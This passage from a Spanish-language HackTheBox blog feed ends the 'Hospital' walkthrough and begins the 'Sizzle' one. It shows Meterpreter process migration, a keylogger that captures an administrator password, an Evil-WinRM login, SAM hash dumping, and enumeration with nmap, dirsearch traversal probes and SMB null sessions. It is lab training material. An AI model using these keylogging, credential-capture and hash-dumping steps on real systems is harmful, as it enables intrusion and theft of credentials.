             xe
 2060  656   svchost.e
             xe
 2096  656   svchost.e
             xe
 2116  656   svchost.e
             xe
 2124  656   svchost.e
             xe
 2424  656   SMSvcHost
             .exe
 2464  656   svchost.e
             xe
 2564  656   svchost.e
             xe
 2700  616   fontdrvho
             st.exe
 2708  520   fontdrvho
             st.exe
 2748  656   svchost.e
             xe
 2768  656   svchost.e
             xe
 2776  656   httpd.exe
 2784  656   Microsoft
             .ActiveDi
             rectory.W
             ebService
             s.exe
 2796  656   svchost.e
             xe
 2808  656   svchost.e
             xe
 2852  656   dfsrs.exe
 2904  656   svchost.e
             xe
 2924  656   dns.exe
 2948  656   hMailServ
             er.exe
 2960  656   svchost.e
             xe
 2984  656   mysqld.ex
             e
 3008  656   svchost.e
             xe
 3020  656   ismserv.e
             xe
 3028  656   mqsvc.exe
 3060  656   svchost.e
             xe
 3068  7396  python.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             e                         wn              s<span class="se">\P</span>ython312<span class="se">\p</span>yt
                                                       hon.exe
 3108  656   svchost.e
             xe
 3120  656   dfssvc.ex
             e
 3140  2124  sihost.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             e                         wn              em32<span class="se">\s</span>ihost.exe
 3144  656   vmtoolsd.
             exe
 3192  656   svchost.e
             xe
 3236  656   vmms.exe
 3244  656   vm3dservi
             ce.exe
 3292  656   svchost.e
             xe
 3308  656   svchost.e
             xe
 3316  656   svchost.e
             xe
 3532  656   svchost.e
             xe
 3572  3244  vm3dservi
             ce.exe
 3888  656   vds.exe
 4116  912   wsmprovho  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             st.exe                    wn              em32<span class="se">\w</span>smprovhos
                                                       t.exe
 4156  2776  httpd.exe
 5208  656   dllhost.e
             xe
 5276  912   WmiPrvSE.
             exe
 5468  656   SMSvcHost
             .exe
 5528  656   vmcompute
             .exe
 5792  656   svchost.e
             xe
 6040  912   ShellExpe  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             rienceHos                 wn              emApps<span class="se">\S</span>hellExp
             t.exe                                     erienceHost_cw5
                                                       n1h2txyewy<span class="se">\S</span>hel
                                                       lExperienceHost
                                                       .exe
 6084  656   msdtc.exe
 6188  6444  explorer.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\e</span>xpl
             exe                       wn              orer.exe
 6256  3068  IEDriverS  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
             erver.exe                 wn              n.HOSPITAL<span class="se">\.</span>cac
                                                       he<span class="se">\s</span>elenium<span class="se">\I</span>ED
                                                       riverServer<span class="se">\w</span><span class="k">in
                                                       </span>32<span class="se">\4</span>.14.0<span class="se">\I</span>EDri
                                                       verServer.exe
 6308  7396  conhost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\c</span>onhost.ex
                                                       e
 6728  1540  taskhostw  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             .exe                      wn              em32<span class="se">\t</span>askhostw.
                                                       exe
 6756  4116  shell.exe  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
                                       wn              n.HOSPITAL<span class="se">\D</span>esk
                                                       top<span class="se">\s</span>hell.exe
 6816  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\s</span>vchost.ex
                                                       e
 6920  6964  ctfmon.ex  x64   1
             e
 6924  912   SearchUI.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             exe                       wn              emApps<span class="se">\M</span>icrosof
                                                       t.Windows.Corta
                                                       na_cw5n1h2txyew
                                                       y<span class="se">\S</span>earchUI.exe
 6964  656   svchost.e
             xe
 7248  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7264  656   svchost.e
             xe
 7316  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7396  1540  powershel  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             l.exe                     wn              em32<span class="se">\W</span>indowsPow
                                                       erShell<span class="se">\v</span>1.0<span class="se">\p</span>o
                                                       wershell.exe
 7496  656   svchost.e
             xe
 7548  5528  vmwp.exe
 7636  7876  iexplore.  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>nterne
                                                       t Explorer<span class="se">\i</span>exp
                                                       lore.exe
 7672  656   svchost.e
             xe
 7824  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7876  6256  iexplore.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s<span class="se">\i</span>nternet expl
                                                       orer<span class="se">\i</span>explore.e
                                                       xe
 7948  6188  vmtoolsd.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s<span class="se">\V</span>Mware<span class="se">\V</span>Mware
                                                        Tools<span class="se">\v</span>mtoolsd
                                                       .exe

meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que el <code class="language-plaintext highlighter-rouge">Dr</code> esta corriendo  <code class="language-plaintext highlighter-rouge">iexplore.exe</code> como la sesión activa es del doctor el es el que esta corriendo el servicio en lo que consiste esta escalada es un hacer un <code class="language-plaintext highlighter-rouge">keylogger</code> para ver lo que hace el <code class="language-plaintext highlighter-rouge">Dr</code> con el proceso.</p>
  </li>
  <li>
    <p>Vamos a migrar al proceso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> migrate 7824
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating from 3452 to 7824...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">keylogger</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_start
Starting the keystroke sniffer ...
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar unos minutos para ver que información capturamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_dump
Dumping captured keystrokes...
administratorTh3B3stH0sp1t4l9786!
</code></pre></div></div>

<ul>
  <li>Y bueno obtenemos credenciales que lo que parece ser son del administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ evil-winrm <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">-i</span> 10.10.11.241

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>hospital<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="hashes">Hashes</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ cme smb 10.10.11.241 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">--sam</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\A</span>dministrator:Th3B3stH0sp1t4l9786! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] Dumping SAM hashes
SMB         10.10.11.241    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:e1ae906d259a980297d5eb72aa7ba35c:::
SMB         10.10.11.241    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.241    445    DC               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
SMB         10.10.11.241    445    DC               [+] Added 3 SAM hashes to the database
</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Sizzle (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html" rel="alternate" type="text/html" title="HackTheBox - Sizzle (insane)" /><published>2024-05-07T00:00:00-06:00</published><updated>2024-05-07T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/ed709304142fdf369e529d6e843ad62e.png" />
</p>

<ul>
  <li>Sizzle is an Insane difficulty Windows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Estos son los puertos abiertos por el protocolo TCP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> 10.10.10.103 <span class="nt">-p21</span>,53,80,135,139,443,445,464,593,3269,9389,49664,49665,49666,49668,49677,49682,49683,49684,49692,49704,49721 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-06 16:49 CST
Nmap scan report <span class="k">for </span>10.10.10.103
Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2024-05-06T22:51:09+00:00; -3s from scanner time.
| http-methods:
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: HTB.LOCAL, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2024-05-06T22:51:10+00:00<span class="p">;</span> <span class="nt">-2s</span> from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: <span class="nt">-2s</span>, deviation: 0s, median: <span class="nt">-3s</span>
| smb2-time:
|   <span class="nb">date</span>: 2024-05-06T22:50:34
|_  start_date: 2024-05-06T22:45:25
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos a ver cual es el nombre del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.10.103
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.103 sizzle.htb.local htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.103 sizzle.htb.local htb.local
</code></pre></div></div>

<ul>
  <li>El puerto 21 esta abierto podemos conectarnos como el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> pero aun así no encontramos nada interesante dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name <span class="o">(</span>10.10.10.103:miguel<span class="o">)</span>: anonymous
331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
Password:
230 User logged <span class="k">in</span><span class="nb">.</span>
Remote system <span class="nb">type </span>is Windows_NT.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|63924|<span class="o">)</span>
125 Data connection already open<span class="p">;</span> Transfer starting.
226 Transfer complete.
ftp&gt;
</code></pre></div></div>

<ul>
  <li>Si vemos las tecnologías que esta empleando el servicio web no vemos nada interesante.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Si vemos la pagina web solo encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/1.png" />
</p>

<ul>
  <li>Si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> encontramos un directorio interesante sin embargo nos piden credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap dirsearch <span class="nt">-u</span> http://10.10.10.103
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/miguel/Hackthebox/Sizzle/nmap/reports/http_10.10.10.103/_24-05-06_17-02-22.txt

Target: http://10.10.10.103/

<span class="o">[</span>17:02:22] Starting:
<span class="o">[</span>17:02:24] 403 -  312B  - /%2e%2e//google.com
<span class="o">[</span>17:02:24] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>17:02:24] 404 -    2KB - /.ashx
<span class="o">[</span>17:02:24] 404 -    2KB - /.asmx
<span class="o">[</span>17:02:41] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
<span class="o">[</span>17:02:46] 404 -    2KB - /admin%20/
<span class="o">[</span>17:02:47] 404 -    2KB - /admin.
<span class="o">[</span>17:03:06] 404 -    2KB - /asset..
<span class="o">[</span>17:03:06] 403 -    1KB - /aspnet_client/
<span class="o">[</span>17:03:06] 301 -  157B  - /aspnet_client  -&gt;  http://10.10.10.103/aspnet_client/
<span class="o">[</span>17:03:11] 403 -    1KB - /certenroll/
<span class="o">[</span>17:03:11] 401 -    1KB - /certsrv/
<span class="o">[</span>17:03:11] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>17:03:20] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
<span class="o">[</span>17:03:31] 301 -  150B  - /images  -&gt;  http://10.10.10.103/images/
<span class="o">[</span>17:03:31] 403 -    1KB - /images/
<span class="o">[</span>17:03:32] 404 -    2KB - /index.php.
<span class="o">[</span>17:03:34] 404 -    2KB - /javax.faces.resource.../
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/help/<span class="k">*</span>
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/vmLog/disable
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/vmLog/output<span class="o">=!</span>/tmp!/pwned
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/java.lang:type<span class="o">=</span>Memory/gc
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/vmSystemProperties
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/jfrStart/filename<span class="o">=!</span>/tmp!/foo
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/write/java.lang:type<span class="o">=</span>Memory/Verbose/true
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/read/java.lang:type<span class="o">=</span><span class="k">*</span>/HeapMemoryUsage
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/search/<span class="k">*</span>:j2eeType<span class="o">=</span>J2EEServer,<span class="k">*</span>
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/read/java.lang:type<span class="o">=</span>Memory/HeapMemoryUsage/used
<span class="o">[</span>17:03:38] 404 -    2KB - /login.wdm%2e
<span class="o">[</span>17:03:41] 404 -    2KB - /mcx/mcxservice.svc
<span class="o">[</span>17:03:58] 404 -    2KB - /reach/sip.svc
<span class="o">[</span>17:03:58] 404 -    2KB - /rating_over.
<span class="o">[</span>17:04:04] 404 -    2KB - /service.asmx
<span class="o">[</span>17:04:12] 404 -    2KB - /static..
<span class="o">[</span>17:04:18] 403 -    2KB - /Trace.axd
<span class="o">[</span>17:04:19] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx
<span class="o">[</span>17:04:25] 404 -    2KB - /WEB-INF./
<span class="o">[</span>17:04:28] 404 -    2KB - /WebResource.axd?d<span class="o">=</span>LER8t9aS
<span class="o">[</span>17:04:28] 404 -    2KB - /webticket/webticketservice.svc

Task Completed
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/2.png" />
</p>

<ul>
  <li>Tenemos el puerto <code class="language-plaintext highlighter-rouge">smb</code> abierto a si que podemos listar recursos compartidos empleando un <code class="language-plaintext highlighter-rouge">null session</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.10.103 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\m</span>iguelito:
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.103    445    SIZZLE           Share           Permissions     Remark
SMB         10.10.10.103    445    SIZZLE           <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.103    445    SIZZLE           ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.103    445    SIZZLE           C<span class="nv">$ </span>                             Default share
SMB         10.10.10.103    445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
SMB         10.10.10.103    445    SIZZLE           Department Shares READ
SMB         10.10.10.103    445    SIZZLE           IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.10.103    445    SIZZLE           NETLOGON                        Logon server share
SMB         10.10.10.103    445    SIZZLE           Operations
SMB         10.10.10.103    445    SIZZLE           SYSVOL                          Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos permisos de lectura en 2 directorios.</p>
  </li>
  <li>
    <p>Vemos archivos interesantes.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.10.10.103 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-r</span> <span class="s1">'Department Shares'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.10.10.103:445	Name: sizzle.htb.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	./Department Shares
	dr--r--r--                0 Tue Jul  3 10:22:32 2018	<span class="nb">.</span>
	dr--r--r--                0 Tue Jul  3 10:22:32 2018	..
	dr--r--r--                0 Mon Jul  2 14:21:43 2018	Accounting
	dr--r--r--                0 Mon Jul  2 14:14:28 2018	Audit
	dr--r--r--                0 Tue Jul  3 10:22:39 2018	Banking
	dr--r--r--                0 Mon Jul  2 14:15:01 2018	CEO_protected
	dr--r--r--                0 Mon Jul  2 14:22:06 2018	Devops
	dr--r--r--                0 Mon Jul  2 14:11:57 2018	Finance
	dr--r--r--                0 Mon Jul  2 14:16:11 2018	HR
	dr--r--r--                0 Mon Jul  2 14:14:24 2018	Infosec
	dr--r--r--                0 Mon Jul  2 14:13:59 2018	Infrastructure
	dr--r--r--                0 Mon Jul  2 14:12:04 2018	IT
	dr--r--r--                0 Mon Jul  2 14:12:09 2018	Legal
	dr--r--r--                0 Mon Jul  2 14:15:25 2018	M&amp;A
	dr--r--r--                0 Mon Jul  2 14:14:43 2018	Marketing
	dr--r--r--                0 Mon Jul  2 14:11:47 2018	R&amp;D
	dr--r--r--                0 Mon Jul  2 14:14:37 2018	Sales
	dr--r--r--                0 Mon Jul  2 14:21:46 2018	Security
	dr--r--r--                0 Mon Jul  2 14:16:54 2018	Tax
	dr--r--r--                0 Tue Jul 10 16:39:32 2018	Users
	dr--r--r--                0 Mon Jul  2 14:32:58 2018	ZZ_ARCHIVE
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Nos vamos a conectar con <code class="language-plaintext highlighter-rouge">smbclient</code> para poder descargar e indagar mas.</p>
  </li>
  <li>
    <p>En el directorio <code class="language-plaintext highlighter-rouge">Users</code> encontramos nombres de usuarios del sistema.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-smbclient htb.local/null@sizzle.htb.local <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Department Shares</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Tue Jul  3 10:22:32 2018 <span class="nb">.</span>
drw-rw-rw-          0  Tue Jul  3 10:22:32 2018 ..
drw-rw-rw-          0  Mon Jul  2 14:21:43 2018 Accounting
drw-rw-rw-          0  Mon Jul  2 14:14:28 2018 Audit
drw-rw-rw-          0  Tue Jul  3 10:22:39 2018 Banking
drw-rw-rw-          0  Mon Jul  2 14:15:01 2018 CEO_protected
drw-rw-rw-          0  Mon Jul  2 14:22:06 2018 Devops
drw-rw-rw-          0  Mon Jul  2 14:11:57 2018 Finance
drw-rw-rw-          0  Mon Jul  2 14:16:11 2018 HR
drw-rw-rw-          0  Mon Jul  2 14:14:24 2018 Infosec
drw-rw-rw-          0  Mon Jul  2 14:13:59 2018 Infrastructure
drw-rw-rw-          0  Mon Jul  2 14:12:04 2018 IT
drw-rw-rw-          0  Mon Jul  2 14:12:09 2018 Legal
drw-rw-rw-          0  Mon Jul  2 14:15:25 2018 M&amp;A
drw-rw-rw-          0  Mon Jul  2 14:14:43 2018 Marketing
drw-rw-rw-          0  Mon Jul  2 14:11:47 2018 R&amp;D
drw-rw-rw-          0  Mon Jul  2 14:14:37 2018 Sales
drw-rw-rw-          0  Mon Jul  2 14:21:46 2018 Security
drw-rw-rw-          0  Mon Jul  2 14:16:54 2018 Tax
